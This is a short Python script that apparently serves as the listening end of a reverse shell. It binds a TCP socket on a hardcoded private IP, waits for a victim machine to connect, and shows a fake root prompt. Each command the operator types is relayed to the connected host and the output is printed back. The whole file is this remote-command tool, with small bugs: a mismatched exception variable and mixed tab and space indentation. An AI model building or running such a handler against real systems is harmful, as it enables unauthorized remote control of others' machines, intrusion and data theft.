import socket
port=int();
ip=str();
port=int(input("port: "));
ip="192.168.43.47"
def socket_creat():
    global socketOBJ;
    try:	
        socketOBJ=socket.socket(socket.AF_INET,socket.SOCK_STREAM,0);
        print("[*]creating socket...");	
    except socket.error as masg:
        print("[!]here were problem occoured",msg);
def bind_socket():
	print("[*]binding socket {}:{}".format(ip,str(port)));
	socketOBJ.bind((ip,port));
	socketOBJ.listen(5);

def accept_conn():
	global connection;
	global address
	connection,address=socketOBJ.accept()
	print("[*]session started on {}:{}".format(address[0],address[1]))

def request_responce():
    print("[*]moving into shell");
    while True:
    	print("\nroot@{}:~#".format(address[0]),end="");
    	cmd=input();
    	connection.send(str.encode(cmd));
    	print(connection.recv(1024).decode("utf-8"),end="");

		
    			
def main():
	socket_creat();
	bind_socket();
	accept_conn()
	request_responce();
main();
